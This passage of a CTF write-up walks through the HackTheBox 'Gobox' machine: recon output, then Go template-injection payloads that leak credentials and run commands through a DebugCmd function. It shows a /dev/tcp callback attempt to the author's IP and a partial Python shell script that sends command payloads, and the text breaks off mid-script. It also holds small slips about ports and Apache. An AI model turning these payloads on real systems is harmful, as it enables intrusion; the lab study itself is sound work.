@@ -1,0 +1,679 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Gobox</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-gobox">htb-gobox</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#uhc">uhc</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#golang">golang</a> <a class="post-tag" href="/tags#ssti">ssti</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#youtube">youtube</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#python-cmd">python-cmd</a> <a class="post-tag" href="/tags#aws">aws</a> <a class="post-tag" href="/tags#awscli">awscli</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#s3">s3</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#upload">upload</a> <a class="post-tag" href="/tags#nginx-module">nginx-module</a> <a class="post-tag" href="/tags#backdoor">backdoor</a> <a class="post-tag" href="/tags#nginxexecute">nginxexecute</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-08-30T12:00:00+00:00" itemprop="datePublished">Aug 30, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/08/30/htb-gobox.html" style="color: #e6e6e6; text-decoration: none;">HTB: Gobox</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/gobox-cover.webp" type="image/webp"/>
+<img alt="Gobox" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/gobox-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>HackTheBox made Gobox to be used in the Hacking Esports UHC competition on Aug 29, 2021. Once the competition is over, HTB put it out for all of us to play. This is neat box, created by IppSec, where I’ll exploit a server-side template injection vulnerability in a Golang webserver to leak creds to the site, and then the full source. I’ll use the source with the SSTI to get execution, but no shell. I’ll write a script to make enumeration easy, and then identify the host is in AWS, and is managing a bucket the hosts another site. I’ll upload a PHP webshell to get a shell on the main host. Finally, I’ll find a backdoor NGINX module which is enabled, reverse it to get execution, and get a shell as root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/378 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/gobox" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Gobox</a> <a href="https://hackthebox.com/machines/gobox" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-gobox.webp" type="image/webp"/> <img alt="Gobox" class="img-av" src="/icons/box-gobox.png"/></picture></a><br/><a href="https://hackthebox.com/machines/gobox" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right">30 Aug 2021</td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">30 Aug 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/3769" rel="noopener" target="_blank"><img alt="Ippsec" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3769" style="display: unset"/><span class="user-text" style="display: none"> Ippsec</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found four open TCP ports, SSH (22), and three HTTP servers (80, 4566, and 8080):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.11.113
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 12:14 EDT
+Nmap scan report for 10.10.11.113
+Host is up (0.16s latency).
+Not shown: 65528 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+4566/tcp open     kwtc
+8080/tcp open     http-proxy
+9000/tcp filtered cslistener
+9001/tcp filtered tor-orport
+9002/tcp filtered dynamid
+
+Nmap done: 1 IP address (1 host up) scanned in 104.28 seconds
+
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80,4566,8080 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.11.113
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 12:17 EDT
+Nmap scan report for 10.10.11.113
+Host is up (0.094s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
+|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
+|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
+80/tcp   open  http    nginx
+|_http-title: Hacking eSports | {{.Title}}
+4566/tcp open  http    nginx
+|_http-title: 403 Forbidden
+8080/tcp open  http    nginx
+|_http-title: Hacking eSports | Home page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.75 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu 20.04 Focal. There are three filtered ports, 9001, 9002, and 9003, which is likely an indication that the firewall is blocking them.</p>
+<h3 id="http---tcp-80">HTTP - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is a Hacking eSports page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826122736665.webp" type="image/webp"/>
+<img alt="image-20210826122736665" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826122736665.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">nmap</code>  showed the page title, which almost looked like an error. It shows up that way in Firefox as well:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826122814961.webp" type="image/webp"/>
+<img alt="image-20210826122814961" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826122814961.png"/>
+</picture>
+<p>Not much else going on.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The response headers don’t give any additional information:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 26 Aug 2021 16:24:25 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1803</span>
+</code></pre></div></div>
+<p>Visiting <code class="language-plaintext highlighter-rouge">/index.php</code> loads the same page, so the site is based on PHP.</p>
+<p>Checking <code class="language-plaintext highlighter-rouge">/index.html</code> shows just the text “test”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826123128972.webp" type="image/webp"/>
+<img alt="image-20210826123128972" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826123128972.png"/>
+</picture>
+<p>Not much to do with that.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.113 <span class="nt">-x</span> php
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.3.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.113
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [php]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-yellow">301</span><span class="go">        7l       11w      162c http://10.10.11.113/css
+</span><span class="feroxbuster-green">200</span><span class="go">       54l      190w        0c http://10.10.11.113/index.php
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m    119996/119996  0s      </span><span class="feroxbuster-green">found</span><span class="go">:2       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     59998/59998   521/s   http://10.10.11.113
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     59998/59998   521/s   http://10.10.11.113/css
+</span></code></pre></div></div>
+<p>It doesn’t find anything interesting at all.</p>
+<h3 id="http---tcp-4566">HTTP - TCP 4566</h3>
+<p>The site on TCP 4566 just returns a 403 Forbidden. The HTTP response headers are the same as on 80. <code class="language-plaintext highlighter-rouge">feroxbuster</code> didn’t find anything either, as the site seems to send 403 responses to any path.</p>
+<h3 id="http---tcp-8080">HTTP - TCP 8080</h3>
+<h4 id="site-1">Site</h4>
+<p>The HTTP server on 8080 returns a login form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826123642978.webp" type="image/webp"/>
+<img alt="image-20210826123642978" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826123642978.png"/>
+</picture>
+<p>Given this was presented in a UHC competition, it’s not even clear to me if it uses the <code class="language-plaintext highlighter-rouge">gobox.htb</code> domain, so guessing at emails is likely not the path.</p>
+<p>Submitting generates a POST request with just the email and password:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.11.113:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">36</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://10.10.11.113:8080</span>
+<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://10.10.11.113:8080/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+email=0xdf%40gobox.htb&amp;password=%27
+</code></pre></div></div>
+<p>If I try to enter a non-email address into the email form, it complains on submit:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826123818734.webp" type="image/webp"/>
+<img alt="image-20210826123818734" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826123818734.png"/>
+</picture>
+<p>I sent the POST request to Burp repeater to test some basic SQL injections, but didn’t find anything.</p>
+<p>There’s a link on the page to “Forgot Password”, which loads <code class="language-plaintext highlighter-rouge">/forgot/</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826124032261.webp" type="image/webp"/>
+<img alt="image-20210826124032261" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826124032261.png"/>
+</picture>
+<p>The same kind of filtering is done client-side to match an email. If I submit a real email, it claims to have sent an email:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826124142158.webp" type="image/webp"/>
+<img alt="image-20210826124142158" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826124142158.png"/>
+</picture>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>The HTTP response headers here have additional information:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 26 Aug 2021 16:35:48 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Forwarded-Server</span><span class="p">:</span> <span class="s">golang</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1752</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">X-Forwarded-Server</code> header is not a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">standard HTTP header</a>. It’s specifically calling out that this server is written in Go.</p>
+<p>Anything I put after <code class="language-plaintext highlighter-rouge">/</code> (other than <code class="language-plaintext highlighter-rouge">/forgot/</code>) seems to return the same page, the login form. This behavior is unlike something I’d see from a PHP server, though NGINX could be configured to act this way. Still, given the hint about Go, this seems like a custom Go web server.</p>
+<h4 id="directory-brute-force-1">Directory Brute Force</h4>
+<p><code class="language-plaintext highlighter-rouge">feroxbuster</code> is smart enough to identify the default pages and ignore those. It doesn’t find anything else except <code class="language-plaintext highlighter-rouge">/forgot</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.11.113:8080
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.3.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.11.113:8080
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">       54l      109w     1752c Got </span><span class="feroxbuster-green">200</span><span class="go"> for http://10.10.11.113:8080/7b11184a6a174bbbb1a69d3e329f1dce (url length: 32)
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">         -         -         - Wildcard response is static; auto-filtering 1752 responses; toggle this behavior by using </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">       54l      109w     1752c Got </span><span class="feroxbuster-green">200</span><span class="go"> for http://10.10.11.113:8080/803b36aa00db4e3085275d65269c0061ca8050f645d44520a943a05497b2c30d514a4c03936f4a778950b0672f2cd30b (url length: 96)
+</span><span class="feroxbuster-yellow">301</span><span class="go">        2l        3w       43c http://10.10.11.113:8080/forgot
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">       50l       93w     1482c Got </span><span class="feroxbuster-green">200</span><span class="go"> for http://10.10.11.113:8080/forgot/9d63571fbcb4421baa68ccff67ab5120 (url length: 32)
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">         -         -         - Wildcard response is static; auto-filtering 1482 responses; toggle this behavior by using </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-cyan">WLD</span><span class="go">       50l       93w     1482c Got </span><span class="feroxbuster-green">200</span><span class="go"> for http://10.10.11.113:8080/forgot/48b2790c677c458fa367f43da1cbd0bba70e94ee98ef48a2a25c18468802824ae945f798abf64ab5a2bec2eb0054e53a (url length: 96)
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 1m     59998/59998   0s      </span><span class="feroxbuster-green">found</span><span class="go">:5       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 59s    30001/29999   503/s   http://10.10.11.113:8080
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 59s    30001/29999   503/s   http://10.10.11.113:8080/forgot
+</span></code></pre></div></div>
+<h2 id="rce-as-root-in-aws-container">RCE as root in aws Container</h2>
+<h3 id="access-page-source">Access Page Source</h3>
+<h4 id="ssti">SSTI</h4>
+<p>With the Python and Ruby templating engines one of the first things I look for is server-side template injection (SSTI). The basic idea is passing in what would be code to the templating engine and seeing if it runs it or handles it as text.</p>
+<p><a href="https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html">This post</a> does a nice job talking about how to start looking for SSTI in Go. The payload <code class="language-plaintext highlighter-rouge">{{html "0xdf"}}</code> will resolve to “0xdf” if the site is vulnerable. From Repeater (because I can’t send these payload through Firefox because of the client-side filtering), I’ll enter that payload, and look at the response:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826130637205.webp" type="image/webp"/>
+<img alt="image-20210826130637205" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826130637205.png"/>
+</picture>
+<p>It worked! On line 40, it says “Email Sent To: ssti”.</p>
+<p><code class="language-plaintext highlighter-rouge">{{ . }}</code> will return the data structure passed into the template, which the post suggests is similar to <code class="language-plaintext highlighter-rouge">{{ self }}</code> in other templating systems. Putting that in returns the following:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826130827990.webp" type="image/webp"/>
+<img alt="image-20210826130827990" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826130827990.png"/>
+</picture>
+<p>That’s an email address and a likely password.</p>
+<h4 id="login">Login</h4>
+<p>Those creds do work to log into the site, which return what looks to be the source of the site:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826131912187.webp" type="image/webp"/>
+<img alt="image-20210826131912187" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826131912187.png"/>
+</picture>
+<h3 id="rce">RCE</h3>
+<h4 id="identify-debugcmd">Identify DebugCmd</h4>
+<p>The source is interesting, but the thing that quickly jumps out to me is the <code class="language-plaintext highlighter-rouge">DebugCmd</code> function:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">u</span> <span class="n">User</span><span class="p">)</span> <span class="n">DebugCmd</span> <span class="p">(</span><span class="n">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
+  <span class="n">ipp</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Split</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="n">bin</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="o">:</span><span class="m">1</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="n">args</span> <span class="o">:=</span> <span class="n">strings</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">ipp</span><span class="p">[</span><span class="m">1</span><span class="o">:</span><span class="p">],</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">{</span>
+    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="n">out</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">bin</span><span class="p">)</span><span class="o">.</span><span class="n">CombinedOutput</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It isn’t used elsewhere in the page, but it exists.</p>
+<h4 id="execution">Execution</h4>
+<p>In the SSTI above, I used <code class="language-plaintext highlighter-rouge">{{ . }}</code> to print the current objects passed into the template. I can also reference functions from the code within <code class="language-plaintext highlighter-rouge">{{ }}</code>. <a href="https://www.calhoun.io/intro-to-templates-p3-functions/">This post</a> talks about how to reference objects (including functions) from the templating engine using a <code class="language-plaintext highlighter-rouge">.function_name</code>. Submitting <code class="language-plaintext highlighter-rouge">{{ .DebugCmd "id" }}</code> returns proof of execution:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826132627098.webp" type="image/webp"/>
+<img alt="image-20210826132627098" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826132627098.png"/>
+</picture>
+<h3 id="connection-fails">Connection Fails</h3>
+<p>I tried a bunch of things to get a connection back to my host, but all failed. First I tried to <code class="language-plaintext highlighter-rouge">ping</code> my host with <code class="language-plaintext highlighter-rouge">{{ .DebugCmd "ping -c 1 10.10.14.6" }}</code>, but it returned <code class="language-plaintext highlighter-rouge">/bin/bash: ping: command not found</code>. I tried giving it full path in <code class="language-plaintext highlighter-rouge">/usr/bin</code> and others, but no luck. I switched to running <code class="language-plaintext highlighter-rouge">find</code> commands like <code class="language-plaintext highlighter-rouge">find / -name ping</code>. <code class="language-plaintext highlighter-rouge">ping</code>, <code class="language-plaintext highlighter-rouge">wget</code>, <code class="language-plaintext highlighter-rouge">nc</code>, <code class="language-plaintext highlighter-rouge">curl</code>, were all not on the host.</p>
+<p>I verified that my syntax would work by searching for <code class="language-plaintext highlighter-rouge">bash</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210826133041067.webp" type="image/webp"/>
+<img alt="image-20210826133041067" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210826133041067.png"/>
+</picture>
+<p>I tried to use <code class="language-plaintext highlighter-rouge">/dev/tcp</code> to contact my host with <code class="language-plaintext highlighter-rouge">"echo test &gt; /dev/tcp/10.10.14.6/443"</code>. It just hung the page. My thinking here is that the site is now trying to contact me, but the firewall is blocking outbound. So the site keeps trying until it times out. After a full minute or two:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">504</span> <span class="ne">Gateway Time-out</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 26 Aug 2021 17:32:44 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">160</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;&lt;title&gt;</span>504 Gateway Time-out<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;center&gt;&lt;h1&gt;</span>504 Gateway Time-out<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
+<span class="nt">&lt;hr&gt;&lt;center&gt;</span>nginx<span class="nt">&lt;/center&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<h3 id="command-script">Command Script</h3>
+<p>I’ll write a quick shell to allow me to enumerate the filesystem. <a href="https://www.youtube.com/watch?v=B_NXWx8BuHM">This video</a> shows the process for that:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" height="315" src="https://www.youtube.com/embed/PP05zq1ZsB0" style="border: 0px" title="YouTube video player" width="560"></iframe>
+<p>Here’s the final script (with a few variable renames):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3    
+</span>
+<span class="kn">import</span> <span class="n">re</span>    
+<span class="kn">import</span> <span class="n">requests</span>    
+<span class="kn">from</span> <span class="n">cmd</span> <span class="kn">import</span> <span class="n">Cmd</span>    
+<span class="kn">from</span> <span class="n">html</span> <span class="kn">import</span> <span class="n">unescape</span>    
+
+
+<span class="k">class</span> <span class="nc">Term</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>    
+    <span class="n">prompt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">gobox&gt; </span><span class="sh">"</span>    
+    <span class="n">capture_re</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">Email Sent To: (.*?)\s+&lt;button class</span><span class="sh">"</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>    
+
+    <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>    
+        <span class="sh">"""</span><span class="s">Run given input as command on gobox</span><span class="sh">"""</span>    
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'"'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\\</span><span class="sh">"'</span><span class="p">)</span>    
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://10.10.11.113:8080/forgot/</span><span class="sh">'</span><span class="p">,</span>    
+                <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">{{{{ .DebugCmd </span><span class="sh">"</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="sh">"</span><span class="s"> }}}}</span><span class="sh">'</span><span class="p">},</span>    
+                <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">})</span>    
+        <span class="k">try</span><span class="p">:</span>    
